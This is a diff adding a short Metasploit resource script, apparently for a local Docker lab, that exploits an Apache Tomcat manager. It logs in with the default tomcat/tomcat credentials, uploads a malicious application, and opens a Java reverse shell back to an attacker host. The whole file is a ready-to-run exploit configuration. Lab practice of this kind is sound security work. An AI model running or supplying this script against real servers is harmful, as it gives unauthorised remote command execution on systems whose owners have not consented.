@@ -1,0 +1,15 @@
+# Tomcat Manager Shell Upload - One-shot exploit
+# Run: msfconsole -q -r ~/.msf4/scripts/pwn-tomcat.rc
+#
+# Prerequisites:
+#   - Tomcat container running (docker compose up -d tomcat)
+#   - Kali on 172.20.0.5
+
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 172.20.0.19
+set RPORT 8080
+set HttpUsername tomcat
+set HttpPassword tomcat
+set PAYLOAD java/shell_reverse_tcp
+set LHOST 172.20.0.5
+exploit
